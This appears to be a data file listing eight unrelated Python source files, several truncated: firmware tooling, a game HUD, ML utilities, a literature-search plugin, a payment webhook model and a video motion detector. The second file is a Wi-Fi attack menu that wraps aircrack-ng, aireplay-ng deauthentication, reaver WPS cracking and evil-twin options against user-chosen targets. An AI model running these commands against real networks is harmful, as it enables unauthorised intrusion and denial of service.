    "#!/usr/bin/env python3\n\"\"\"\nfwpack - Pack/Unpack DRC/DRH firmware files\nCreated in 2024 by GaryOderNichts\n<https://github.com/GaryOderNichts/drc-fw-patches>\n\nCredits to drxtool for the firmware header logic and extracted files structure.\n\"\"\"\n\nimport sys, os\nimport binascii\nimport construct\n\nclass FirmwareType:\n    FIRMWARE_TYPE_DRC = 0x01010000\n    FIRMWARE_TYPE_DRH = 0x00010000\n\nBlobHeader = construct.Struct(\n    \"imageVersion\" / construct.Int32ub,\n    \"blockSize\" / construct.Int32ub,\n    \"sequencePerSession\" / construct.Int32ub,\n    \"imageSize\" / construct.Int32ub,\n)\nassert(BlobHeader.sizeof() == 0x10)\n\nFirmwareHeader = construct.Struct(\n    \"type\" / construct.Int32ul,\n    \"superCRCs\" / construct.Array(4, construct.Int32ul),\n    construct.Padding(0xFE8),\n    \"headerCRC\" / construct.Int32ul,\n    \"subCRCs\" / construct.Array(0x1000, construct.Int32ul),\n)\nassert(FirmwareHeader.sizeof() == 0x5000)\n\nFirmwareSection = construct.Struct(\n    \"offset\" / construct.Int32ul,\n    \"size\" / construct.Int32ul,\n    \"name\" / construct.PaddedString(4, \"ascii\"),\n    \"version\" / construct.Int32ul,\n)\nassert(FirmwareSection.sizeof() == 0x10)\n\nFirmwareFile = construct.Struct(\n    \"blobHeader\" / BlobHeader,\n    \"firmwareHeader\" / FirmwareHeader,\n    \"firmwareData\" / construct.Bytes(construct.this.blobHeader.imageSize - FirmwareHeader.sizeof()),\n)\n\n# Thanks to drxtool for the crctable logic\ndef verify_firmware_header(fw) -> bool:\n    # Verify header CRC\n    header_crc = binascii.crc32(FirmwareHeader.build(fw.firmwareHeader)[0:0xFFC])\n    if header_crc != fw.firmwareHeader.headerCRC:\n        return False\n    \n    # Verify super crcs\n    subcrc_data = construct.Array(0x1000, construct.Int32ul).build(fw.firmwareHeader.subCRCs)\n    for i in range(4):\n        super_crc = binascii.crc32(subcrc_data[i*0x1000:i*0x1000+0x1000])\n        if super_crc != fw.firmwareHeader.superCRCs[i]:\n            return False\n\n    # Verify sub crcs\n    for i in range(len(fw.firmwareData) // 0x1000 + 1):\n        offset = i * 0x1000\n        length = 0x1000\n        if len(fw.firmwareData) - offset < length:\n            length = len(fw.firmwareData) - offset\n\n        sub_crc = binascii.crc32(fw.firmwareData[offset:offset + length])\n        if sub_crc != fw.firmwareHeader.subCRCs[i]:\n            return False\n\n    return True\n\ndef build_firmware_header(blob_type, firmware_data) -> dict:\n    # Calculate CRC for every 0x1000 bytes of firmware data\n    sub_crcs = [0] * 0x1000\n    for i in range(len(firmware_data) // 0x1000 + 1):\n        offset = i * 0x1000\n        length = 0x1000\n        if len(firmware_data) - offset < length:\n            length = len(firmware_data) - offset\n\n        sub_crcs[i] = binascii.crc32(firmware_data[offset:offset + length])\n\n    # Calculate the super CRCs\n    super_crcs = [0] * 4\n    subcrc_data = construct.Array(0x1000, construct.Int32ul).build(sub_crcs)\n    for i in range(4):\n        super_crcs[i] = binascii.crc32(subcrc_data[i*0x1000:i*0x1000+0x1000])\n\n    firmware_header = dict(type=blob_type, superCRCs=super_crcs, headerCRC=0, subCRCs=sub_crcs)\n\n    # Calculate the header CRC\n    firmware_header[\"headerCRC\"] = binascii.crc32(FirmwareHeader.build(firmware_header)[0:0xFFC])\n\n    return firmware_header\n\ndef unpack_firmware(source_file, dest_dir):\n    fw = FirmwareFile.parse_file(source_file)\n    if not verify_firmware_header(fw):\n        print(\"Firmware header verification failed\")\n        sys.exit(1)\n\n    if fw.firmwareHeader.type == FirmwareType.FIRMWARE_TYPE_DRC:\n        print(f\"DRC firmware version 0x{fw.blobHeader.imageVersion:08x}\")\n    elif fw.firmwareHeader.type == FirmwareType.FIRMWARE_TYPE_DRH:\n        print(f\"DRH firmware version 0x{fw.blobHeader.imageVersion:08x}\")\n    else:\n        print(f\"Unsupported firmware type 0x{fw.firmwareHeader.type:08x}\")\n        sys.exit(1)\n\n    if not os.path.isdir(dest_dir):\n        os.mkdir(dest_dir)\n\n    # Write blob header and type\n    BlobHeader.build_file(fw.blobHeader, os.path.join(dest_dir, \"blob_header.bin\"))\n    construct.Int32ul.build_file(fw.firmwareHeader.type, os.path.join(dest_dir, \"blob_type.bin\"))\n\n    # Assume first part of the data is the index\n    index = FirmwareSection.parse(fw.firmwareData)\n\n    # Parse sections\n    sections = construct.Array(index.size // FirmwareSection.sizeof(), FirmwareSection).parse(fw.firmwareData)\n    for s in sections:\n        print(f\"Saving {s.name} version 0x{s.version:08x} offset 0x{s.offset} size 0x{s.size}\")\n\n        # write section to file\n        with open(os.path.join(dest_dir, s.name + \".bin\"), \"wb\") as f:\n            f.write(fw.firmwareData[s.offset:s.offset + s.size])\n\ndef pack_firmware(source_dir, dest_file):\n    # Read blob header and type\n    blob_header = BlobHeader.parse_file(os.path.join(source_dir, \"blob_header.bin\"))\n    blob_type = construct.Int32ul.parse_file(os.path.join(source_dir, \"blob_type.bin\"))\n\n    # Parse sections from INDX\n    firmware_data = b\"\"\n    sections = construct.GreedyRange(FirmwareSection).parse_file(os.path.joi",
    "#!/usr/bin/env python3\nimport os\nimport subprocess\nfrom subprocess import check_call\nprint(\"\\nInstalling Needed Tools\")\nprint(\"\\n\")\ncmd0 = os.system(\"apt-get install aircrack-ng crunch xterm wordlists reaver pixiewps bully xterm wifite bettercap wifipumpkin3\")\ncmd  = os.system(\"sleep 3 && clear\")\ndef intro():\n    cmd  = os.system(\"clear\")\n    print(\"\"\"\\033[1;25m\n\n\n   \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588    \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2584\u2584\u2584\u2584       \u2588\u2588\u2588      \u2584\u2588  \u2588\u2588\u2588\u2584\u2584\u2584\u2584      \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2584\u2588              \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2584\u2588\u2588   \u2584      \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \n  \u2588\u2588\u2588    \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588\u2580\u2580\u2580\u2588\u2588\u2584 \u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2584 \u2588\u2588\u2588  \u2588\u2588\u2588\u2580\u2580\u2580\u2588\u2588\u2584   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588             \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588   \u2588\u2588\u2584   \u2588\u2588\u2588    \u2588\u2588\u2588 \n  \u2588\u2588\u2588    \u2588\u2580    \u2588\u2588\u2588    \u2588\u2580  \u2588\u2588\u2588   \u2588\u2588\u2588    \u2580\u2588\u2588\u2588\u2580\u2580\u2588\u2588 \u2588\u2588\u2588\u258c \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2580  \u2588\u2588\u2588             \u2588\u2588\u2588    \u2588\u2580  \u2588\u2588\u2588\u2584\u2584\u2584\u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2580  \n  \u2588\u2588\u2588         \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588   \u2580 \u2588\u2588\u2588\u258c \u2588\u2588\u2588   \u2588\u2588\u2588  \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \u2588\u2588\u2588            \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \u2580\u2580\u2580\u2580\u2580\u2580\u2588\u2588\u2588  \u2584\u2588\u2588\u2588\u2584\u2584\u2584     \n\u2580\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588     \u2588\u2588\u2588\u258c \u2588\u2588\u2588   \u2588\u2588\u2588 \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \u2588\u2588\u2588           \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \u2584\u2588\u2588   \u2588\u2588\u2588 \u2580\u2580\u2588\u2588\u2588\u2580\u2580\u2580     \n         \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2584  \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588     \u2588\u2588\u2588  \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2584  \u2588\u2588\u2588             \u2588\u2588\u2588    \u2588\u2584  \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2584  \n   \u2584\u2588    \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588   \u2588\u2588\u2588     \u2588\u2588\u2588     \u2588\u2588\u2588  \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588\u258c    \u2584       \u2588\u2588\u2588    \u2588\u2588\u2588 \u2588\u2588\u2588   \u2588\u2588\u2588   \u2588\u2588\u2588    \u2588\u2588\u2588 \n \u2584\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2580    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2580\u2588   \u2588\u2580     \u2584\u2588\u2588\u2588\u2588\u2580   \u2588\u2580    \u2580\u2588   \u2588\u2580    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2584\u2584\u2588\u2588       \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588  \u2580\u2588\u2588\u2588\u2588\u2588\u2580    \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 \n                                                                            \u2580                                                                                                                                                      \nAuthors  : AKASH|ASWIN|SUDEV|SARATH\n-------------------------------------------------------------------------  \n(1)Start monitor mode       \n(2)Stop monitor mode\n(3)Scan Networks                            \n(4)Getting Handshake(monitor mode needed)                                       \n(5)WPS Networks attacks (Bssid,monitor mode needed)\n(6)Scan for WPS Networks\n(7)DOS Attacks\n(8)Captive Portal\n(9)Evil Twin\n(10)Advanced Monitoring\n\n(0)About Our Team\n(00)Exit\n----------------------------------------------------------------------- \"\"\")\n    print(\"\\nEnter your choise here : !# \")\n    var = int(input(\"\"))\n    if var == 1 :\n        print(\"\\nEnter the interface:(Default(wlan0/wlan1))\")\n        interface = input(\"\")\n        order = \"airmon-ng start {} && airmon-ng check kill\".format(interface)\n        geny  = os.system(order)\n        intro()\n    elif var == 2 :\n        print(\"\\nEnter the interface:(Default(wlan0mon/wlan1mon))\")\n        interface = input(\"\")\n        order = \"airmon-ng stop {} && service network-manager restart\".format(interface)\n        geny  = os.system(order)\n        intro()\n    elif var == 3 :\n        print(\"\\nEnter the interface:(Default >> (wlan0mon/wlan1mon))\")\n        interface = input(\"\")\n        order = \"airodump-ng {} -M\".format(interface)\n        print(\"When Done Press CTRL+c\")\n        cmd = os.system(\"sleep 3\")\n        geny  = os.system(order)\n        cmd = os.system(\"sleep 10\")\n        intro()\n    \n    elif var == 4 :\n        print(\"\\nEnter the interface:(Default >>(wlan0mon/wlan1mon))\")\n        interface = input(\"\")\n        order     = \"airodump-ng {} -M\".format(interface)\n        print(\"\\nWhen Done Press CTRL+c\")\n        print(\"\\nNote: Under Probe it might be Passwords So copy them to the worlist file\")\n        print(\"\\nDon't Attack The Network if its Data is ZERO (you waste your time)\")\n        print(\"\\nyou Can use 's' to arrange networks\")\n        cmd       = os.system(\"sleep 7\")\n        geny      = os.system(order)\n        print(\"\\nEnter the bssid of the target?\")\n        bssid     = str(input(\"\"))\n        print(\"\\nEnter the channel of the network?\")\n        channel   = int(input())\n        print(\"Enter the path of the output file ?\")\n        path = str(input(\"\"))\n        print(\"\\nEnter the number of the packets [1-10000] ( 0 for unlimited number)\")\n        print(\"the number of the packets Depends on the Distance Between you and the network\")\n        dist = int(input(\"\"))\n        order = \"airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}\".format(interface,bssid,channel,path,dist,bssid,interface)\n        geny = os.system(order)\n        intro()\n    elif var == 0 :\n    \n        cmd = os.system(\"clear\")\n        print(\"\"\"\nHi.\nThis is Our Team\n\"\"\")\n        quit()\n    elif var == 00:\n        exit()    \n        \n    elif var == 5:\n        cmd = os.system(\"clear\")\n        print(\"\"\"\n1)Reaver\n2)Bully\n3)wifite (Recommeneded)\n4)PixieWps\n5)wp3 \n0) Back to Main Menu\n\"\"\")\n        print(\"Choose the kind of the attack(External WIFI Adapter Require) ?\")\n        attack = int(input(\"\"))\n        if attack == 1:\n            print(\"\\nEnter the interface to start ?(Default(Wlan0mon/Wlan1mon))\")\n            interface = str(input(\"\"))\n            print(\"\\nEnter the bssid of the network ?\")\n            bssid = str(input(\"\"))\n            order = (\"reaver -i {} -b {} -vv\").format(interface,bssid)\n        ",
    "import constants as const\nimport pygame as pg\n\n\nclass Options:\n    def __init__(self, screen) -> None:\n        self.screen = screen\n        self.displaying_map: bool = False\n        self.crit_time = False\n        self.time_left: int = const.GAME_TIME\n        self.hostages_to_rescue: int = const.HOSTAGES_PLACED\n        self.map_usages: int = 3\n        self.pathfinding_usages: int = 1\n\n    def display_data(self) -> None:\n        font = pg.font.SysFont(const.FONT, const.FONT_SIZE)\n        options = [\n            font.render(\n                f'Hostages to rescue: {self.hostages_to_rescue}',\n                False,\n                const.REGULAR_COLOR\n            ),\n            font.render(\n                f'Time left: {self.time_left // 60}:{self.time_left % 60:0>2}',\n                False,\n                const.REGULAR_COLOR if self.time_left > 30 else const.CRIT_COLOR\n            ),\n            font.render(\n                f'Map usages: {self.map_usages}',\n                False,\n                const.REGULAR_COLOR if self.map_usages > 0 else const.CRIT_COLOR\n            ),\n            font.render(\n                f'Path finding usages: {self.pathfinding_usages}',\n                False,\n                const.REGULAR_COLOR if self.pathfinding_usages > 0 else const.CRIT_COLOR\n            ),\n        ]\n        for idx, option in enumerate(options):\n            self.screen.blit(\n                option,\n                (3, 3 + idx * const.FONT_SIZE)\n            )\n\n# comment to commit\n",
    "import numpy as np\nfrom scipy.sparse import csr_matrix\nfrom operator import itemgetter\nimport random\n\nimport numpy as np\nimport torch\ndef init_seed(seed, reproducibility):\n    r\"\"\" init random seed for random functions in numpy, torch, cuda and cudnn\n\n    Args:\n        seed (int): random seed\n        reproducibility (bool): Whether to require reproducibility\n    \"\"\"\n    random.seed(seed)\n    np.random.seed(seed)\n    torch.manual_seed(seed)\n    torch.cuda.manual_seed(seed)\n    torch.cuda.manual_seed_all(seed)\n    # if reproducibility:\n    #     torch.backends.cudnn.benchmark = False\n    #     torch.backends.cudnn.deterministic = True\n    # else:\n    #     torch.backends.cudnn.benchmark = True\n    #     torch.backends.cudnn.deterministic = False\n\n\ndef data_masks(all_sessions, n_node):\n    indptr, indices, data = [], [], []\n    indptr.append(0)\n    for j in range(len(all_sessions)):\n        session = np.unique(all_sessions[j])\n        length = len(session)\n        s = indptr[-1]\n        indptr.append((s + length))\n        for i in range(length):\n            indices.append(session[i]-1)\n            data.append(1)\n    matrix = csr_matrix((data, indices, indptr), shape=(len(all_sessions), n_node))\n    return matrix\n\ndef data_easy_masks(mat, n_row, n_col):\n    data, indices, indptr  = mat[0], mat[1], mat[2]\n\n    matrix = csr_matrix((data, indices, indptr), shape=(n_row, n_col))\n    return matrix\n\ndef split_validation(train_set, valid_portion):\n    train_set_x, train_set_y = train_set\n    n_samples = len(train_set_x)\n    sidx = np.arange(n_samples, dtype='int32')\n    np.random.shuffle(sidx)\n    n_train = int(np.round(n_samples * (1. - valid_portion)))\n    valid_set_x = [train_set_x[s] for s in sidx[n_train:]]\n    valid_set_y = [train_set_y[s] for s in sidx[n_train:]]\n    train_set_x = [train_set_x[s] for s in sidx[:n_train]]\n    train_set_y = [train_set_y[s] for s in sidx[:n_train]]\n\n    return (train_set_x, train_set_y), (valid_set_x, valid_set_y)\n\nclass Data():\n    def __init__(self, data, shuffle=False, n_node=None):\n        # data formulation: 0:id_seq, 1:flag, 2:labs\n        self.raw = np.asarray(data[0])  # sessions, item_seq\n        self.flags = np.asarray(data[1])\n        self.targets = np.asarray(data[2])\n\n        H_T = data_easy_masks(data[3], n_node, n_node)  # 10000 * 6558 #sessions * #items H_T in \n        self.adjacency = H_T.tocoo()\n        self.length = len(self.raw)\n        self.shuffle = shuffle\n\n    def get_overlap(self, sessions):\n        matrix = np.zeros((len(sessions), len(sessions)))\n        for i in range(len(sessions)):\n            seq_a = set(sessions[i])\n            seq_a.discard(0)\n            for j in range(i+1, len(sessions)):\n                seq_b = set(sessions[j])\n                seq_b.discard(0)\n                overlap = seq_a.intersection(seq_b)\n                ab_set = seq_a | seq_b\n                matrix[i][j] = float(len(overlap))/float(len(ab_set))\n                matrix[j][i] = matrix[i][j]\n        matrix = matrix + np.diag([1.0]*len(sessions))\n        degree = np.sum(np.array(matrix), 1)\n        degree = np.diag(1.0/degree)\n        return matrix, degree\n\n    def generate_batch(self, batch_size):\n        if self.shuffle:\n            shuffled_arg = np.arange(self.length)\n            np.random.shuffle(shuffled_arg)\n            # \u6253\u4e71session item_seq&price_seq\u7684\u987a\u5e8f\n            self.raw = self.raw[shuffled_arg]\n            self.flags = self.flags[shuffled_arg]\n            self.targets = self.targets[shuffled_arg]\n        n_batch = int(self.length / batch_size)\n        if self.length % batch_size != 0:\n            n_batch += 1\n        slices = np.split(np.arange(n_batch * batch_size), n_batch)\n        slices[-1] = np.arange(self.length-batch_size, self.length)\n        return slices\n\n    def get_slice(self, index):\n        items, num_node = [], []\n        inp = self.raw[index]\n\n        for session in inp:\n            num_node.append(len(np.nonzero(session)[0]))\n        max_n_node = np.max(num_node)\n        session_len = []\n        reversed_sess_item = []\n        mask = []\n        for session in inp:\n            nonzero_elems = np.nonzero(session)[0]\n            session_len.append([len(nonzero_elems)])\n            if max_n_node - len(nonzero_elems) == 0:\n                items.append(session)\n                mask.append([1] * len(nonzero_elems))\n                reversed_sess_item.append(list(reversed(session)))\n            else:\n                items.append(session + (max_n_node - len(nonzero_elems)) * [0])\n                mask.append([1] * len(nonzero_elems) + (max_n_node - len(nonzero_elems)) * [0])\n                reversed_sess_item.append(list(reversed(session)) + (max_n_node - len(nonzero_elems)) * [0])\n\n\n        return self.targets[index]-1, self.flags[index], session_len,items, reversed_sess_item, mask,\n\n\n",
    "import gradio as gr\nimport re\nimport requests\nimport time\nimport xml.etree.ElementTree as ET\nimport yake\n\nfrom modules.logging_colors import logger\n\nparams = {\n    \"arxiv_url\": \"http://export.arxiv.org/api/\",\n    \"ncbi_url\": \"https://eutils.ncbi.nlm.nih.gov/entrez/eutils\",\n    \"replace_botwords\": True,\n    \"search_arxiv\": False,\n    \"search_pubmed\": True,\n    \"tagger_active\": False,\n    \"tagger_url\": \"https://tagger.jensenlab.org/\",\n    \"yake_active\": False,\n    \"yake_limit\": 10,\n    \"yake_score\": 0.05\n}\n\ndef add_context(articles, state):\n    \"\"\"\n    Creates LLM context from a set of references.\n    \"\"\"\n    for article in articles:\n        if \"id\" in article and \"title\" in article:\n            state[\"context\"] += \"\\n\\n\"+article[\"id\"]+\"\\ntitle: \"+article[\"title\"]\n            if \"abstract\" in article:\n                state[\"context\"] += \"\\nabstract: \"+article[\"abstract\"]\n\ndef retrieve_arxiv(refs):\n    \"\"\"\n    Retrieves titles and abstracts for a list of arXiv identifiers.\n    \"\"\"\n    postdata = {\n        \"id_list\": \",\".join(set(refs))\n    }\n    xmlstring = requests.post(params[\"arxiv_url\"]+\"/query\", data=postdata).text\n    articles = []\n    root = ET.fromstring(xmlstring)\n    for node in root:\n        if node.tag == \"{http://www.w3.org/2005/Atom}entry\":\n            article = {}\n            for node in node:\n                if node.tag == \"{http://www.w3.org/2005/Atom}id\":\n                    article[\"id\"] = re.sub(r\".*?([0-9][0-9][0-9][0-9]\\.[0-9]+)(v[0-9]+)?\", r\"arXiv:\\1\", node.text)\n                elif node.tag == \"{http://www.w3.org/2005/Atom}title\":\n                    article[\"title\"] = node.text\n                elif node.tag == \"{http://www.w3.org/2005/Atom}summary\":\n                    article[\"abstract\"] = node.text\n            articles.append(article)\n    return articles\n\ndef retrieve_pubmed(refs):\n    \"\"\"\n    Retrieves titles and abstracts for a list of PubMed identifiers.\n    \"\"\"\n    postdata = {\n        \"db\": \"pubmed\",\n        \"id\": \",\".join(set(refs))\n    }\n    xmlstring = requests.post(params[\"ncbi_url\"]+\"/efetch.fcgi\", data=postdata).text\n    articles = []\n    root = ET.fromstring(xmlstring)\n    for node in root:\n        if node.tag == \"PubmedArticle\":\n            article = {}\n            for node in node:\n                if node.tag == \"MedlineCitation\":\n                    for node in node:\n                        if node.tag == \"PMID\":\n                            article[\"id\"] = \"PMID:\"+node.text\n                        elif node.tag == \"Article\":\n                            for node in node:\n                                if node.tag == \"ArticleTitle\" and node.text is not None:\n                                    article[\"title\"] = node.text\n                                if node.tag == \"Abstract\":\n                                    for node in node:\n                                        if node.tag == \"AbstractText\" and node.text is not None:\n                                            article[\"abstract\"] = node.text\n            articles.append(article)\n    return articles\n\ndef search_arxiv(terms):\n    \"\"\"\n    Search arXiv for a list of terms.\n    \"\"\"\n    terms = ['\"'+term+'\"' for term in terms]\n    if (len(terms) > 1):\n        terms = list(set([i+\" \"+j for i,j in zip(terms, terms[1:])]))+list(set(terms))\n    refs = set()\n    for term in terms:\n        postdata = {\n            \"max_results\": 5,\n            \"search_query\": term,\n            \"sortBy\": \"relevance\"\n        }\n        xmlstring = requests.post(params[\"arxiv_url\"]+\"/query\", data=postdata).text\n        root = ET.fromstring(xmlstring)\n        for node in root:\n            if node.tag == \"{http://www.w3.org/2005/Atom}entry\":\n                for node in node:\n                    if node.tag == \"{http://www.w3.org/2005/Atom}id\":\n                        refs.add(re.sub(r\".*?([0-9][0-9][0-9][0-9]\\.[0-9]+)(v[0-9]+)?\", r\"\\1\", node.text))\n        if len(refs) >= 20:\n            break\n        time.sleep(1.0)\n    return refs\n\ndef search_pubmed(terms):\n    \"\"\"\n    Search Pubmed for a list of terms.\n    \"\"\"\n    if (len(terms) > 1):\n        terms = list(set([i+\" AND \"+j for i,j in zip(terms, terms[1:])]))+list(set(terms))\n    refs = set()\n    for term in terms:\n        postdata = {\n            \"db\": \"pubmed\",\n            \"retmax\": 5,\n            \"sort\": \"relevance\",\n            \"term\": term\n        }\n        xmlstring = requests.post(params[\"ncbi_url\"]+\"/esearch.fcgi\", data=postdata).text\n        root = ET.fromstring(xmlstring)\n        for node in root:\n            if node.tag == \"IdList\":\n                for node in node:\n                    if node.tag == \"Id\":\n                        refs.add(node.text)\n        if len(refs) >= 20:\n            break\n        time.sleep(1.0)\n    return refs\n\ndef ui():\n    \"\"\"\n    Gets executed when the UI is drawn. Custom gradio elements and\n    their corresponding event handlers should be defined here.\n    \"\"\"\n    with gr.Accordion(\"Seshat\", open=True):\n        with gr.Row():\n            replace_botwords",
    "from . import datasets\nfrom . import encoders\nfrom . import decoders\nfrom . import losses\nfrom . import metrics\n\nfrom .decoders.unet import Unet\nfrom .decoders.unetplusplus import UnetPlusPlus\nfrom .decoders.manet import MAnet\nfrom .decoders.linknet import Linknet\nfrom .decoders.fpn import FPN\nfrom .decoders.pspnet import PSPNet\nfrom .decoders.deeplabv3 import DeepLabV3, DeepLabV3Plus\nfrom .decoders.pan import PAN\nfrom .decoders.upernet import UPerNet\n\nfrom .__version__ import __version__\n\n# some private imports for create_model function\nfrom typing import Optional as _Optional\nimport torch as _torch\n\n\ndef create_model(\n    arch: str,\n    encoder_name: str = \"resnet34\",\n    encoder_weights: _Optional[str] = \"imagenet\",\n    in_channels: int = 3,\n    classes: int = 1,\n    **kwargs,\n) -> _torch.nn.Module:\n    \"\"\"Models entrypoint, allows to create any model architecture just with\n    parameters, without using its class\n    \"\"\"\n\n    archs = [\n        Unet,\n        UnetPlusPlus,\n        MAnet,\n        Linknet,\n        FPN,\n        PSPNet,\n        DeepLabV3,\n        DeepLabV3Plus,\n        PAN,\n        UPerNet,\n    ]\n    archs_dict = {a.__name__.lower(): a for a in archs}\n    try:\n        model_class = archs_dict[arch.lower()]\n    except KeyError:\n        raise KeyError(\n            \"Wrong architecture type `{}`. Available options are: {}\".format(\n                arch,\n                list(archs_dict.keys()),\n            )\n        )\n    return model_class(\n        encoder_name=encoder_name,\n        encoder_weights=encoder_weights,\n        in_channels=in_channels,\n        classes=classes,\n        **kwargs,\n    )\n",
    "\"\"\"\nthe just pay webhook data.\n\"\"\"\nfrom typing import Optional\n\nfrom payze.param.webhook import base\n\n\nclass JustPay(base.BaseModel):\n    \"\"\"\n    the just pay main response model\n    \"\"\"\n    source: str = base.Field(alias=\"Source\")\n    idempotency_key: str = base.Field(alias=\"IdempotencyKey\")\n    payment_id: str = base.Field(alias=\"PaymentId\")\n    type: str = base.Field(alias=\"Type\")\n    sandbox: bool = base.Field(alias=\"Sandbox\")\n    payment_status: str = base.Field(alias=\"PaymentStatus\")\n    amount: float = base.Field(alias=\"Amount\")\n    final_amount: Optional[float] = base.Field(alias=\"FinalAmount\")\n    currency: str = base.Field(alias=\"Currency\")\n    rrn: Optional[str] = base.Field(alias=\"RRN\")\n    commission: Optional[float] = base.Field(alias=\"Commission\")\n    preauthorized: bool = base.Field(alias=\"Preauthorized\")\n    can_be_captured: bool = base.Field(alias=\"CanBeCaptured\")\n    create_date: int = base.Field(alias=\"CreateDate\")\n    create_date_iso: str = base.Field(alias=\"CreateDateIso\")\n    capture_date: Optional[int] = base.Field(alias=\"CaptureDate\")\n    capture_date_iso: Optional[str] = base.Field(alias=\"CaptureDateIso\")\n    block_date: Optional[int] = base.Field(alias=\"BlockDate\")\n    block_date_iso: Optional[str] = base.Field(alias=\"BlockDateIso\")\n    token: Optional[str] = base.Field(alias=\"Token\")\n    card_mask: Optional[str] = base.Field(alias=\"CardMask\")\n    card_origination: Optional[str] = base.Field(alias=\"CardOrigination\")\n    card_owner_entity_type: Optional[str] = base.Field(alias=\"CardOwnerEntityType\")  # noqa\n    card_brand: Optional[str] = base.Field(alias=\"CardBrand\")\n    card_country: Optional[str] = base.Field(alias=\"CardCountry\")\n    card_holder: Optional[str] = base.Field(alias=\"CardHolder\")\n    expiration_date: Optional[str] = base.Field(alias=\"ExpirationDate\")\n    secure_card_id: Optional[str] = base.Field(alias=\"SecureCardId\")\n    rejection_reason: Optional[str] = base.Field(alias=\"RejectionReason\")\n    refund: Optional[base.Refund] = base.Field(alias=\"Refund\")\n    splits: Optional[list] = base.Field(alias=\"Splits\")\n    metadata: Optional[base.Metadata] = base.Field(alias=\"Metadata\")\n    payer: Optional[base.Payer] = base.Field(alias=\"Payer\")\n",
    "import cv2\r\nimport gradio as gr\r\nimport numpy as np\r\nimport matplotlib.pyplot as plt\r\n\r\n# input_video = 'car.mp4'\r\n\r\n# video Inference\r\n\r\n\r\ndef vid_inf(vid_path):\r\n    # Create a VideoCapture object\r\n    cap = cv2.VideoCapture(vid_path)\r\n\r\n    # get the video frames' width and height for proper saving of videos\r\n    frame_width = int(cap.get(3))\r\n    frame_height = int(cap.get(4))\r\n    fps = int(cap.get(cv2.CAP_PROP_FPS))\r\n    frame_size = (frame_width, frame_height)\r\n    fourcc = cv2.VideoWriter_fourcc(*'mp4v')\r\n    output_video = \"output_recorded.mp4\"\r\n\r\n    # create the `VideoWriter()` object\r\n    out = cv2.VideoWriter(output_video, fourcc, fps, frame_size)\r\n\r\n    # Create Background Subtractor MOG2 object\r\n    backSub = cv2.createBackgroundSubtractorMOG2()\r\n\r\n    # Check if camera opened successfully\r\n    if not cap.isOpened():\r\n        print(\"Error opening video file\")\r\n    count = 0\r\n    # Read until video is completed\r\n    while cap.isOpened():\r\n        # Capture frame-by-frame\r\n        ret, frame = cap.read()\r\n        # print(frame.shape)\r\n        if ret:\r\n            # Apply background subtraction\r\n            fg_mask = backSub.apply(frame)\r\n            # print(fg_mask.shape)\r\n            # cv2.imshow('Frame_bg', fg_mask)\r\n\r\n            # apply global threshol to remove shadows\r\n            retval, mask_thresh = cv2.threshold(\r\n                fg_mask, 180, 255, cv2.THRESH_BINARY)\r\n            # cv2.imshow('frame_thresh', mask_thresh)\r\n\r\n            # set the kernal\r\n            kernel = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (3, 3))\r\n            # Apply erosion\r\n            mask_eroded = cv2.morphologyEx(mask_thresh, cv2.MORPH_OPEN, kernel)\r\n            # cv2.imshow('frame_erode', mask_eroded)\r\n\r\n            # Find contours\r\n            contours, hierarchy = cv2.findContours(\r\n                mask_eroded, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)\r\n            # print(contours)\r\n\r\n            min_contour_area = 2000  # Define your minimum area threshold\r\n            large_contours = [\r\n                cnt for cnt in contours if cv2.contourArea(cnt) > min_contour_area]\r\n            # frame_ct = cv2.drawContours(frame, large_contours, -1, (0, 255, 0), 2)\r\n            frame_out = frame.copy()\r\n            for cnt in large_contours:\r\n                # print(cnt.shape)\r\n                x, y, w, h = cv2.boundingRect(cnt)\r\n                frame_out = cv2.rectangle(\r\n                    frame, (x, y), (x+w, y+h), (0, 0, 200), 3)\r\n            frame_out_display = cv2.cvtColor(frame_out, cv2.COLOR_BGR2RGB)\r\n            vid = out.write(frame_out)\r\n\r\n            # Display the resulting frame\r\n            # cv2.imshow('Frame_final', frame_out)\r\n\r\n            # update the count every frame and display every 12th frame\r\n            if not count % 12:\r\n                yield 